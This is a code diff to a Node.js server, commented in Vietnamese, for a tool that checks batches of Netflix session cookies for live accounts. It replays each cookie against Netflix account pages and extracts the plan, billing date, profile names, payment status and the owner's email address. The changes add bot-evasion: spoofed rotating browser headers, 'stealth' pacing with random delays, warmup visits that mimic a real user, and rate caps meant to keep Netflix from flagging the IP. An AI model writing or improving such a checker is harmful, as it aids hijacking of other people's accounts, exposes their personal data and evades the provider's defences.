@@ -6,6 +6,7 @@ const https = require('https');
 const http = require('http');
 const zlib = require('zlib');
 const { v4: uuidv4 } = require('uuid');
+const { nfExtractEmailFromHtml, nfDetectPaymentHold } = require('./lib/nf-email-parse');
 
 // SQLite — khởi tạo singleton trước khi route dùng query layer
 require('./db/database');
@@ -155,8 +156,38 @@ const NF_UA_POOL = [
   },
 ];
 
-// Tạo header browser-realistic cho 1 request Netflix (xoay UA + đủ sec-ch/sec-fetch).
-// Mô phỏng điều hướng thật: từ trang chủ → /account (Referer + Sec-Fetch-User).
+// Một "phiên browser" cố định cho cả warmup + /account (không đổi UA giữa 2 request).
+function createNetflixBrowserSession(cookieStr, extra = {}) {
+  const p = NF_UA_POOL[Math.floor(Math.random() * NF_UA_POOL.length)];
+  const common = {
+    'User-Agent': p.ua,
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Upgrade-Insecure-Requests': '1',
+    'sec-ch-ua': p.chUa,
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': p.platform,
+    'Sec-Fetch-Dest': 'document',
+    'Sec-Fetch-Mode': 'navigate',
+    'Sec-Fetch-User': '?1',
+    'Cache-Control': 'max-age=0',
+    Cookie: cookieStr.trim(),
+    ...extra,
+  };
+  return {
+    home: {
+      ...common,
+      'Sec-Fetch-Site': 'none',
+    },
+    account: {
+      ...common,
+      'Sec-Fetch-Site': 'same-origin',
+      Referer: 'https://www.netflix.com/browse',
+    },
+  };
+}
+
 function buildNetflixHeaders(extra = {}) {
   const p = NF_UA_POOL[Math.floor(Math.random() * NF_UA_POOL.length)];
   return {
@@ -183,7 +214,54 @@ const NETFLIX_HEADERS = buildNetflixHeaders();
 // Delay ngẫu nhiên (ms) — tránh pattern request đều đặn dễ bị quét.
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 const randDelay = (min = 800, max = 2500) =>
-  sleep(min + Math.floor(Math.random() * (max - min)));
+  sleep(min + Math.floor(Math.random() * Math.max(1, max - min)));
+
+// Tốc độ check — chậm = ít request, ít burst, khó bị Netflix gắn bot.
+const CHECK_PACES = {
+  normal: {
+    preMin: 800, preMax: 2500, gapMin: 1500, gapMax: 4000,
+    warmupMin: 0, warmupMax: 0, betweenMin: 0, betweenMax: 0,
+    nftMin: 0, nftMax: 800, skipNftoken: false, warmup: false,
+  },
+  slow: {
+    preMin: 5000, preMax: 11000, gapMin: 12000, gapMax: 25000,
+    warmupMin: 800, warmupMax: 2200, betweenMin: 1200, betweenMax: 3500,
+    nftMin: 0, nftMax: 0, skipNftoken: true, warmup: true,
+  },
+  stealth: {
+    preMin: 10000, preMax: 22000, gapMin: 20000, gapMax: 45000,
+    warmupMin: 1500, warmupMax: 4000, betweenMin: 2500, betweenMax: 6000,
+    nftMin: 0, nftMax: 0, skipNftoken: true, warmup: true,
+  },
+};
+
+const CHECK_MAX_PER_HOUR = Math.max(10, parseInt(process.env.CHECK_MAX_PER_HOUR || '50', 10) || 50);
+const checkRateState = { windowStart: Date.now(), count: 0 };
+
+function assertCheckRateLimit() {
+  const now = Date.now();
+  if (now - checkRateState.windowStart > 3600000) {
+    checkRateState.windowStart = now;
+    checkRateState.count = 0;
+  }
+  checkRateState.count += 1;
+  if (checkRateState.count > CHECK_MAX_PER_HOUR) {
+    const err = new Error(`Đã đạt ${CHECK_MAX_PER_HOUR} lượt check/giờ — nghỉ ~${Math.ceil((3600000 - (now - checkRateState.windowStart)) / 60000)} phút để tránh Netflix quét IP`);
+    err.code = 'RATE_LIMIT';
+    throw err;
+  }
+}
+
+function resolveCheckPace(id) {
+  const key = String(id || process.env.CHECK_PACE || 'stealth').toLowerCase().trim();
+  const cfg = CHECK_PACES[key] || CHECK_PACES.stealth;
+  return { ...cfg, key: CHECK_PACES[key] ? key : 'stealth' };
+}
+
+const CHECK_DEBUG = String(process.env.CHECK_DEBUG || '').toLowerCase() === '1';
+function nfLog(...args) {
+  if (CHECK_DEBUG) console.log(...args);
+}
 
 function isNetflixPremiumPlan(planStr) {
   if (!planStr || typeof planStr !== 'string') return false;
@@ -313,63 +391,10 @@ function nfExtractPlan(html) {
   return null;
 }
 
-// Extract email directly from Netflix HTML (doesn't need nftoken.site)
-function nfExtractEmail(html) {
-  if (!html) return null;
-  const emailPats = [
-    /"userLogin"\s*:\s*"([^"@]{2,50}@[^"]{2,50})"/,
-    /"email"\s*:\s*"([^"@]{2,50}@[^"]{2,50})"/,
-    /"memberEmail"\s*:\s*"([^"@]{2,50}@[^"]{2,50})"/,
-    /"loginName"\s*:\s*"([^"@]{2,50}@[^"]{2,50})"/,
-    /"primaryEmail"\s*:\s*"([^"@]{2,50}@[^"]{2,50})"/,
-    /"accountEmail"\s*:\s*"([^"@]{2,50}@[^"]{2,50})"/,
-  ];
-  for (const pat of emailPats) {
-    const m = html.match(pat);
-    if (m) return m[1].trim();
-  }
-  return null;
-}
-
-// Deep email extraction from Netflix reactContext JSON
-function nfExtractEmailFallback(html) {
-  if (!html) return null;
-
-  // 1. Find netflix.reactContext (main embedded data blob)
-  //    Netflix stores user info: memberLoginId, userLogin, email
-  const ctxPats = [
-    /netflix\.reactContext\s*=\s*(\{[\s\S]{200,}?\})\s*;?\s*<\/script>/,
-    /"memberLoginId"\s*:\s*"([^"@]{1,60}@[^"]{2,60})"/,
-    /"membershipEmail"\s*:\s*"([^"@]{1,60}@[^"]{2,60})"/,
-    /"userEmail"\s*:\s*"([^"@]{1,60}@[^"]{2,60})"/,
-    // Visible email in account page (may be masked: p***@gmail.com)
-    /data-uia="account-overview-page[^"]*email[^"]*"[^>]*>([^<@]{1,40}@[^<]{2,40})</i,
-    // Inside script context — broader key match
-    /"[a-zA-Z]{0,20}[Ee]mail[a-zA-Z]{0,20}"\s*:\s*"([^"]{2,60}@[^"]{2,60})"/,
-    /"[a-zA-Z]{0,20}[Ll]ogin[a-zA-Z]{0,20}"\s*:\s*"([^"]{2,60}@[^"]{2,60})"/,
-  ];
-
-  for (const pat of ctxPats) {
-    const m = html.match(pat);
-    if (!m) continue;
-    const candidate = m[1]?.trim();
-    if (!candidate) continue;
-    // If it's the full reactContext blob, re-search inside it
-    if (candidate.startsWith('{')) {
-      const inner = candidate.match(/"(?:memberLoginId|userLogin|email|memberEmail)"\s*:\s*"([^"@]{1,60}@[^"]{2,60})"/);
-      if (inner) return inner[1].trim();
-      continue;
-    }
-    // Validate: must have @, not be a Netflix internal email, not example domain
-    if (candidate.includes('@') &&
-        !candidate.includes('netflix.com') &&
-        !candidate.includes('example.') &&
-        !candidate.includes('noreply') &&
-        !candidate.includes('support@')) {
-      return candidate;
-    }
-  }
-  return null;
+function nfPushProfile(profiles, rawName) {
+  const name = nfClean(rawName);
+  if (!name || /^\d+$/.test(name) || profiles.includes(name)) return;
+  profiles.push(name);
 }
 
 const NF_CANCEL_KW = [
@@ -390,17 +415,30 @@ const NF_PAYERR_KW = [
 // Logic: GET /account với cookie → check element data-uia cụ thể
 //   Có "account-overview-page+membership-card+payment+details" → LIVE
 //   Không có → subscription ended / cancelled
-async function fetchNetflixAccountInfo(cookieStr) {
+async function fetchNetflixAccountInfo(cookieStr, pace) {
   try {
     const cookie = cookieStr.trim();
-    const nfH = buildNetflixHeaders({
-      Cookie: cookie,
-      'Accept-Encoding': 'gzip, deflate, br',
-    });
+    const p = pace || resolveCheckPace();
+    const session = createNetflixBrowserSession(cookie);
 
-    // Delay ngẫu nhiên trước khi chạm Netflix → giảm pattern bot
-    await randDelay();
-    const res = await nodeRequest('https://www.netflix.com/account', { method: 'GET', headers: nfH, timeout: 15000 });
+    await randDelay(p.preMin, p.preMax);
+
+    let browsePaymentHold = false;
+    // Warmup: vào trang chủ/browse trước (giống user thật) — chỉ slow/stealth
+    if (p.warmup) {
+      try {
+        const browseRes = await nodeRequest('https://www.netflix.com/browse', {
+          method: 'GET', headers: session.home, timeout: 12000,
+        });
+        if (browseRes.status === 200) browsePaymentHold = nfDetectPaymentHold(browseRes.text());
+      } catch { /* bỏ qua — vẫn thử /account */ }
+      await randDelay(p.warmupMin, p.warmupMax);
+      await randDelay(p.betweenMin, p.betweenMax);
+    }
+
+    const res = await nodeRequest('https://www.netflix.com/account', {
+      method: 'GET', headers: session.account, timeout: 15000,
+    });
 
     // Redirect → cookie expired/invalid
     if (res.status === 301 || res.status === 302) return { reachable: false, reason: 'redirect→login' };
@@ -429,23 +467,44 @@ async function fetchNetflixAccountInfo(cookieStr) {
     // Log all membership-related data-uia attributes found
     const uiaAll = [...html.matchAll(/data-uia="([^"]+)"/g)].map(m => m[1]);
     const uiaMembership = uiaAll.filter(a => a.includes('membership') || a.includes('plan') || a.includes('payment'));
-    console.log(`[NF] status=${res.status} len=${html.length} paymentEl=${hasPaymentEl} cancelBtn=${hasCancelBtn}`);
-    if (uiaMembership.length) console.log(`[NF-UIA]`, uiaMembership.join(', '));
-    // Debug email search
-    const emailDbg = nfExtractEmail(html) || nfExtractEmailFallback(html);
-    console.log(`[NF-EMAIL]`, emailDbg || '(not found)');
-    // Debug profiles
+    nfLog(`[NF] status=${res.status} len=${html.length} paymentEl=${hasPaymentEl} cancelBtn=${hasCancelBtn}`);
+    if (uiaMembership.length) nfLog(`[NF-UIA]`, uiaMembership.join(', '));
+    const emailDbg = nfExtractEmailFromHtml(html);
+    nfLog(`[NF-EMAIL]`, emailDbg || '(not found)');
     const allProfileNames = [...html.matchAll(/"profileName"\s*:\s*"([^"]{1,50})"/g)].map(m=>m[1]).slice(0,5);
-    if (allProfileNames.length) console.log(`[NF-PROFILES]`, allProfileNames);
-
-    // Combine signals: any positive signal = LIVE
-    const isLive = hasPaymentEl || hasCancelBtn;
+    if (allProfileNames.length) nfLog(`[NF-PROFILES]`, allProfileNames);
 
     // ── PLAN — data-uia attribute (most reliable) ──────────────────────────────
     let plan = null;
     const planUia = html.match(/data-uia="account-overview-page\+membership-card\+title"[^>]*>\s*([^<]{2,60})/);
     if (planUia) plan = nfClean(planUia[1]);
     if (!plan) plan = nfExtractPlan(html);
+
+    // Lỗi thanh toán / on hold → không coi là LIVE dù vẫn thấy tên gói trên /account
+    let accountPaymentHold = nfDetectPaymentHold(html);
+    let paymentHold = browsePaymentHold || accountPaymentHold;
+    const htmlLow = html.toLowerCase();
+    let paymentError = paymentHold
+      || NF_PAYERR_KW.some(kw => htmlLow.includes(kw.toLowerCase()))
+      || /"(?:paymentIssue|paymentError|paymentFailed|billingIssue)"\s*:\s*(?:true|1|"true")/i.test(html);
+
+    // Vẫn thấy plan + payment UI nhưng browse chặn popup → xác minh thêm /browse
+    let browseVerifyHold = false;
+    if (plan && !paymentHold) {
+      try {
+        await randDelay(400, 1200);
+        const br = await nodeRequest('https://www.netflix.com/browse', {
+          method: 'GET', headers: session.home, timeout: 12000,
+        });
+        if (br.status === 200) {
+          browseVerifyHold = nfDetectPaymentHold(br.text());
+          if (browseVerifyHold) paymentHold = true;
+        }
+      } catch { /* bỏ qua */ }
+    }
+
+    let subscriptionActive = !paymentHold && (hasPaymentEl || hasCancelBtn);
+    let isLive = subscriptionActive;
 
     // ── BILLING DATE — data-uia attribute ──────────────────────────────────────
     let billingText = null;
@@ -454,15 +513,13 @@ async function fetchNetflixAccountInfo(cookieStr) {
     if (!billingText) billingText = nfExtractBilling(html);
 
     // ── EMAIL ──────────────────────────────────────────────────────────────────
-    const emailFromHtml = nfExtractEmail(html) || nfExtractEmailFallback(html);
+    const emailFromHtml = nfExtractEmailFromHtml(html);
 
     // ── PROFILES ──────────────────────────────────────────────────────────────
     const profiles = [];
     // Method 1: JSON "profileName" key
-    for (const m of html.matchAll(/"profileName"\s*:\s*"([^"]{1,50})"/g)) {
-      const name = m[1].trim();
-      // Exclude pure numbers (those are indices, not names), exclude empty, dedupe
-      if (name && !/^\d+$/.test(name) && !profiles.includes(name)) profiles.push(name);
+    for (const m of html.matchAll(/"profileName"\s*:\s*"((?:\\.|[^"\\]){1,80})"/g)) {
+      nfPushProfile(profiles, m[1]);
     }
     // Method 2: profiles array in JSON
     if (!profiles.length) {
@@ -470,8 +527,7 @@ async function fetchNetflixAccountInfo(cookieStr) {
       if (raw) {
         try {
           for (const p of JSON.parse(raw)) {
-            const name = (p?.summary?.profileName || p?.profileName || p?.name || '').trim();
-            if (name && !/^\d+$/.test(name) && !profiles.includes(name)) profiles.push(name);
+            nfPushProfile(profiles, p?.summary?.profileName || p?.profileName || p?.name || '');
           }
         } catch {}
       }
@@ -479,31 +535,34 @@ async function fetchNetflixAccountInfo(cookieStr) {
     // Method 3: data-uia SSR
     if (!profiles.length) {
       for (const m of html.matchAll(/data-uia="profile-name"[^>]*>\s*([^<]+)/g)) {
-        const name = m[1].trim();
-        if (name && !/^\d+$/.test(name)) profiles.push(name);
+        nfPushProfile(profiles, m[1]);
       }
     }
     // Method 4: "displayName" in profile objects
     if (!profiles.length) {
-      for (const m of html.matchAll(/"displayName"\s*:\s*"([^"]{1,50})"/g)) {
-        const name = m[1].trim();
-        if (name && !/^\d+$/.test(name) && !profiles.includes(name)) profiles.push(name);
+      for (const m of html.matchAll(/"displayName"\s*:\s*"((?:\\.|[^"\\]){1,80})"/g)) {
+        nfPushProfile(profiles, m[1]);
       }
     }
 
-    // ── PAYMENT ERROR ──────────────────────────────────────────────────────────
-    const htmlLow    = html.toLowerCase();
-    const paymentError = NF_PAYERR_KW.some(kw => htmlLow.includes(kw.toLowerCase()))
-      || /"(?:paymentIssue|paymentError|paymentFailed|billingIssue)"\s*:\s*(?:true|1|"true")/i.test(html);
+    // Có tên gói nhưng không còn quyền xem (TT lỗi hoặc hết membership thật)
+    const planLost = !!plan && (paymentHold || paymentError || !subscriptionActive);
+    if (planLost) {
+      isLive = false;
+      subscriptionActive = false;
+    }
 
     return {
       reachable:    true,
-      alive:        isLive,        // ← based on payment element presence
-      cancelled:    !isLive,
+      alive:        isLive,
+      cancelled:    !subscriptionActive && !paymentHold,
+      planLost,
       plan,
       billingText,
       profiles,
       paymentError,
+      paymentHold,
+      browsePaymentHold: browsePaymentHold || browseVerifyHold,
       emailFromHtml,
     };
   } catch (e) {
@@ -538,7 +597,8 @@ async function checkAccountDetails(cookieStr) {
 
     const alive      = data?.status === 'SUCCESS';
     const plan       = data?.plan || data?.subscription || null;
-    const email      = data?.email || null;
+    const email      = data?.email || data?.mail || data?.loginEmail || data?.login
+      || data?.member_email || data?.user_email || data?.account_email || null;
     const screens    = data?.max_streams != null ? parseInt(data.max_streams) : null;
     const hasPremium = alive && isNetflixPremiumPlan(plan);
     const paymentError = !!(data?.paymentError || data?.payment_error);
@@ -934,7 +994,7 @@ app.get('/api/content', requireAuth, requireProfile, (req, res) => {
 // NFTOKEN_MODE=fallback  → direct trước, gọi nftoken nếu unreachable hoặc thiếu plan/email
 // USE_NFTOKEN=1|true|on  → alias của parallel
 function getNftokenMode() {
-  const raw = String(process.env.NFTOKEN_MODE || process.env.USE_NFTOKEN || 'off').toLowerCase().trim();
+  const raw = String(process.env.NFTOKEN_MODE || process.env.USE_NFTOKEN || 'fallback').toLowerCase().trim();
   if (raw === '1' || raw === 'true' || raw === 'on' || raw === 'parallel') return 'parallel';
   if (raw === 'fallback') return 'fallback';
   return 'off';
@@ -944,16 +1004,26 @@ const NFT_SKIPPED = { alive: false, hasPremium: false, plan: null, email: null, 
 
 function mergeCheckResults(nf, nft) {
   const plan = nf.plan || nft.plan || null;
-  const alive = !!(nf.alive || nft.alive);
+  const paymentHold = !!(nf.paymentHold || nf.paymentError);
+  const paymentError = paymentHold || !!(nft.paymentError && !nf.reachable);
+  const planLost = !!(nf.planLost || (nf.reachable && plan && (!nf.alive || paymentHold || paymentError)));
+
+  // LIVE = còn xem được — chỉ tin kết quả direct /account (+ browse), KHÔNG tin nftoken SUCCESS
+  let alive = false;
+  if (nf.reachable) {
+    alive = !!nf.alive && !planLost;
+  } else if (!nft.skipped && nft.alive) {
+    alive = !!nft.alive && !paymentError;
+  }
 
   let source = 'none';
   if (nft.skipped) {
     source = nf.reachable ? 'direct' : 'none';
-  } else if (nf.alive && nft.alive) {
-    source = 'direct+nftoken';
-  } else if (nft.alive) {
+  } else if (nf.reachable && nft.alive) {
+    source = planLost ? 'direct' : 'direct+nftoken';
+  } else if (nft.alive && !nf.reachable) {
     source = 'nftoken';
-  } else if (nf.reachable || nf.alive) {
+  } else if (nf.reachable) {
     source = 'direct';
   }
 
@@ -965,10 +1035,12 @@ function mergeCheckResults(nf, nft) {
     email:        nf.emailFromHtml || nft.email || null,
     screens:      nft.screens      || null,
     hasPremium:   !!(nft.hasPremium || (alive && isNetflixPremiumPlan(plan))),
-    paymentError: !!(nft.paymentError || nf.paymentError),
+    paymentError,
+    paymentHold,
+    planLost,
     profiles:     nf.profiles      || [],
     billingText:  nf.billingText   || null,
-    cancelled:    !alive && !!(nf.reachable || nf.cancelled),
+    cancelled:    !!(nf.cancelled && !planLost) || (!alive && nf.reachable && !planLost),
     reachable:    !!(nf.reachable),
     _nft: nft.skipped ? { skipped: true } : { alive: nft.alive, error: nft.error },
     _nf:  { reachable: nf.reachable, alive: nf.alive, error: nf.error },
@@ -984,29 +1056,42 @@ async function runNftokenCheck(cookieStr) {
 
 function shouldFallbackNftoken(nf) {
   if (!nf.reachable) return true;
-  if (nf.alive && !nf.plan && !nf.emailFromHtml) return true;
+  // Có plan nhưng không có email → gọi nftoken (trường hợp Netflix SSR đổi format)
+  if (!nf.emailFromHtml) return true;
+  if (nf.alive && !nf.plan) return true;
   return false;
 }
 
 // ─── Full check — direct netflix.com (+ nftoken tùy NFTOKEN_MODE) ─────────────
-async function fullCheck(cookieStr) {
+async function fullCheck(cookieStr, paceId) {
   try {
+    assertCheckRateLimit();
+    const pace = resolveCheckPace(paceId);
     const mode = getNftokenMode();
-    const nf = await fetchNetflixAccountInfo(cookieStr).catch(e => ({
+    const nf = await fetchNetflixAccountInfo(cookieStr, pace).catch(e => ({
       reachable: false, alive: false, error: e.message, profiles: [],
     }));
 
     let nft = NFT_SKIPPED;
 
-    if (mode === 'parallel') {
-      nft = await runNftokenCheck(cookieStr);
-    } else if (mode === 'fallback' && shouldFallbackNftoken(nf)) {
-      nft = await runNftokenCheck(cookieStr);
+    if (!pace.skipNftoken) {
+      if (mode === 'parallel') {
+        await randDelay(pace.nftMin, pace.nftMax);
+        nft = await runNftokenCheck(cookieStr);
+      } else if (mode === 'fallback' && shouldFallbackNftoken(nf)) {
+        await randDelay(pace.nftMin, pace.nftMax);
+        nft = await runNftokenCheck(cookieStr);
+      }
     }
 
-    return mergeCheckResults(nf, nft);
+    const out = mergeCheckResults(nf, nft);
+    out.checkPace = pace.key;
+    if (pace.skipNftoken) out.nftokenSkippedStealth = true;
+    return out;
   } catch (e) {
-    return { alive: false, error: e.message, profiles: [], plan: null, billingText: null, nftokenMode: getNftokenMode() };
+    const out = { alive: false, error: e.message, profiles: [], plan: null, billingText: null, nftokenMode: getNftokenMode() };
+    if (e.code === 'RATE_LIMIT') out.rateLimited = true;
+    return out;
   }
 }
 
@@ -1017,11 +1102,12 @@ app.post('/api/checker/live-check', async (req, res) => {
     if (!cookie || typeof cookie !== 'string') {
       return res.status(400).json({ error: 'Thiếu cookie' });
     }
-    const result = await fullCheck(cookie);
+    const result = await fullCheck(cookie, req.body.pace);
     return res.json(result);
   } catch (e) {
     console.error('[live-check] ERROR:', e.message);
-    return res.status(500).json({ alive: false, error: e.message, profiles: [] });
+    const status = e.code === 'RATE_LIMIT' ? 429 : 500;
+    return res.status(status).json({ alive: false, error: e.message, profiles: [], rateLimited: e.code === 'RATE_LIMIT' });
   }
 });
 
@@ -1034,13 +1120,14 @@ app.post('/api/checker/batch', async (req, res) => {
     }
     // CONCURRENCY=1: check tuần tự từ cùng 1 IP → tránh burst song song dễ bị Netflix flag.
     // Mỗi fullCheck đã có randDelay nội bộ; thêm khoảng nghỉ giữa các cookie cho tự nhiên.
+    const pace = resolveCheckPace(req.body.pace);
     const CONCURRENCY = 1;
     const results = new Array(cookies.length).fill(null);
     for (let i = 0; i < cookies.length; i += CONCURRENCY) {
       const slice   = cookies.slice(i, i + CONCURRENCY);
-      const checked = await Promise.all(slice.map(c => fullCheck(c).catch(e => ({ alive: false, error: e.message, profiles: [] }))));
+      const checked = await Promise.all(slice.map(c => fullCheck(c, req.body.pace).catch(e => ({ alive: false, error: e.message, profiles: [] }))));
       checked.forEach((r, j) => { results[i + j] = r; });
-      if (i + CONCURRENCY < cookies.length) await randDelay(1500, 4000);
+      if (i + CONCURRENCY < cookies.length) await randDelay(pace.gapMin, pace.gapMax);
     }
     return res.json({ results });
   } catch (e) {
@@ -1871,7 +1958,13 @@ app.get('/api/domains', async (req, res) => {
 console.log('[BOOT] Registering /api/checker/ping ...');
 app.get('/api/checker/ping', (req, res) => {
   console.log('[PING] called');
-  res.json({ ok: true, ts: Date.now(), version: 'v4', nftokenMode: getNftokenMode() });
+  res.json({
+    ok: true, ts: Date.now(), version: 'v4',
+    nftokenMode: getNftokenMode(),
+    checkPaces: Object.keys(CHECK_PACES),
+    defaultPace: process.env.CHECK_PACE || 'stealth',
+    maxChecksPerHour: CHECK_MAX_PER_HOUR,
+  });
 });
 console.log('[BOOT] /api/checker/ping registered OK');
 
